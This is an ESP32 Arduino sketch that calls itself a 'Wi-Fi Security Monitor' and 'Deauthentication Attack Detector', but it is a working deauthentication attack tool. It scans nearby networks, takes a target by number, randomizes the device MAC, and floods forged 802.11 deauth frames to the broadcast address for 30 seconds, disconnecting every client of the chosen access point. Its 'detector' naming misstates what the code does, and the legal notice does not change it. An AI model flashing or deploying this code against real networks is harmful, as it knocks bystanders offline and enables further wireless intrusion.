/**
 * Wi-Fi Security Monitor - Deauthentication Attack Detector
 * 
 * @file wifi_scanner212.ino
 * @author phoenixdev-512
 * @brief Educational tool for demonstrating Wi-Fi deauthentication attacks
 * @version 2.1.2
 * @date 2024
 * 
 * @copyright Copyright (c) 2024 - MIT License
 * 
 * @warning LEGAL NOTICE: This software is intended for EDUCATIONAL purposes 
 *          and AUTHORIZED security testing only. Unauthorized use may violate 
 *          federal and state laws including the Computer Fraud and Abuse Act.
 *          Always obtain explicit permission before testing any network.
 * 
 * Hardware Requirements:
 * - ESP32 microcontroller (or compatible)
 * 
 * Software Requirements:
 * - Arduino IDE with ESP32 board support
 * - WiFi.h library (included with ESP32 package)
 * - esp_wifi.h library (included with ESP32 package)
 */

#include "WiFi.h"
#include "esp_wifi.h"

// Configuration Constants
#define ATTACK_DURATION 30    // Attack duration in seconds
#define DEAUTH_PACKETS 50     // Number of deauth packets per burst
#define PACKET_DELAY 1        // Delay between packets in milliseconds
#define BURST_DELAY 100       // Delay between bursts in milliseconds

// Global Variables
bool attackRunning = false;   // Track current attack state

/**
 * @brief Generate and apply a random MAC address to the device
 * 
 * This function creates a randomized MAC address and applies it to the
 * ESP32's station interface for enhanced privacy during operations.
 */
void randomizeMAC() {
  uint8_t newMAC[6];
  
  // Generate random bytes for MAC address
  for (int i = 0; i < 6; i++) {
    newMAC[i] = random(0x00, 0xFF);
  }
  
  // Apply new MAC address to station interface
  esp_wifi_set_mac(WIFI_IF_STA, &newMAC[0]);

  // Display new MAC address for verification
  Serial.print("New Random MAC Address: ");
  Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X\n", 
                newMAC[0], newMAC[1], newMAC[2], 
                newMAC[3], newMAC[4], newMAC[5]);
}

/**
 * @brief Construct and send deauthentication packets
 * 
 * @param targetMAC Destination MAC address (client to deauthenticate)
 * @param apMAC Access Point MAC address (BSSID)
 * 
 * This function constructs IEEE 802.11 deauthentication frames and transmits
 * them to disconnect a client from an access point.
 */
void sendDeauth(uint8_t *targetMAC, uint8_t *apMAC) {
  // IEEE 802.11 Deauthentication frame structure
  uint8_t deauthPacket[26] = {
    0xc0, 0x00,                                                           // Frame Control
    0x3a, 0x01,                                                           // Duration
    targetMAC[0], targetMAC[1], targetMAC[2],                            // Destination
    targetMAC[3], targetMAC[4], targetMAC[5],
    apMAC[0], apMAC[1], apMAC[2],                                        // Source (AP)
    apMAC[3], apMAC[4], apMAC[5],
    apMAC[0], apMAC[1], apMAC[2],                                        // BSSID
    apMAC[3], apMAC[4], apMAC[5],
    0x00, 0x00,                                                           // Sequence number
    0x02, 0x00                                                            // Reason code
  };

  // Send burst of deauthentication packets
  for (int i = 0; i < DEAUTH_PACKETS; i++) {
    if (!attackRunning) return; // Allow immediate stop
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), true);
    delay(PACKET_DELAY);
  }
}

/**
 * @brief Scan and display available Wi-Fi networks
 * 
 * Performs a Wi-Fi network scan and displays results including SSID,
 * BSSID (MAC address), and signal strength for each detected network.
 */
void scanNetworks() {
  int networkCount = WiFi.scanNetworks();
  
  Serial.println("\n=== Nearby Wi-Fi Networks ===");
  for (int i = 0; i < networkCount; i++) {
    Serial.printf("[%d] SSID: %-32s | MAC: %s | Signal: %d dBm\n", 
                  i, 
                  WiFi.SSID(i).c_str(), 
                  WiFi.BSSIDstr(i).c_str(), 
                  WiFi.RSSI(i));
  }
  Serial.println("\nEnter the number of the Wi-Fi network to target:");
}

/**
 * @brief Execute deauthentication attack on specified network
 * 
 * @param apMAC Target Access Point MAC address (BSSID)
 * 
 * Launches a time-limited deauthentication attack against all clients
 * connected to the specified access point.
 */
void attackNetwork(uint8_t *apMAC) {
  Serial.println("\n[!] Launching Deauthentication Attack...");
  Serial.printf("[*] Duration: %d seconds\n", ATTACK_DURATION);
  Serial.println("[*] Target: All connected devices (broadcast)");
  
  attackRunning = true;

  // Broadcast MAC address targets all devices
  uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  long startTime = millis();

  // Attack loop with duration limit
  while (millis() - startTime < ATTACK_DURATION * 1000) {
    if (!attackRunning) break; // Allow manual stop
    
    sendDeauth(broadcastMAC, apMAC);
    Serial.println("[+] Deauth packet burst sent");
    delay(BURST_DELAY);
  }

  attackRunning = false;
  Serial.println("\n[*] Attack completed");
}

/**
 * @brief Initialize hardware and software components
 * 
 * Configures serial communication, Wi-Fi mode, randomizes MAC address,
 * and initiates initial network scan.
 */
void setup() {
  Serial.begin(115200);
  delay(100); // Allow serial to stabilize
  
  Serial.println("\n\n========================================");
  Serial.println("  Wi-Fi Security Monitor v2.1.2");
  Serial.println("  Educational & Authorized Testing Only");
  Serial.println("========================================\n");
  
  // Configure Wi-Fi in station mode
  WiFi.mode(WIFI_MODE_STA);
  
  // Apply random MAC address for privacy
  randomizeMAC();
  
  // Perform initial network scan
  Serial.println("\n[*] Scanning for Wi-Fi networks...");
  scanNetworks();
}

/**
 * @brief Main program loop - Process user input
 * 
 * Monitors serial input for network selection or stop commands.
 * Validates input and initiates attacks based on user selection.
 */
void loop() {
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim(); // Remove whitespace

    // Check for stop command
    if (input.equalsIgnoreCase("stop")) {
      attackRunning = false;
      Serial.println("\n[!] Attack manually stopped by user");
      return;
    }

    // Parse and validate network selection
    int selectedNetwork = input.toInt();
    int networkCount = WiFi.scanNetworks();
    
    if (selectedNetwork >= 0 && selectedNetwork < networkCount) {
      uint8_t apMAC[6];
      
      // Parse BSSID string to MAC address bytes
      sscanf(WiFi.BSSIDstr(selectedNetwork).c_str(), 
             "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
             &apMAC[0], &apMAC[1], &apMAC[2], 
             &apMAC[3], &apMAC[4], &apMAC[5]);

      // Display target information
      Serial.printf("\n[*] Target Selected:\n");
      Serial.printf("    SSID: %s\n", WiFi.SSID(selectedNetwork).c_str());
      Serial.printf("    BSSID: %s\n", WiFi.BSSIDstr(selectedNetwork).c_str());
      
      // Execute attack
      attackNetwork(apMAC);
    } else {
      Serial.println("\n[!] Invalid selection. Please try again.");
    }
  }
} 
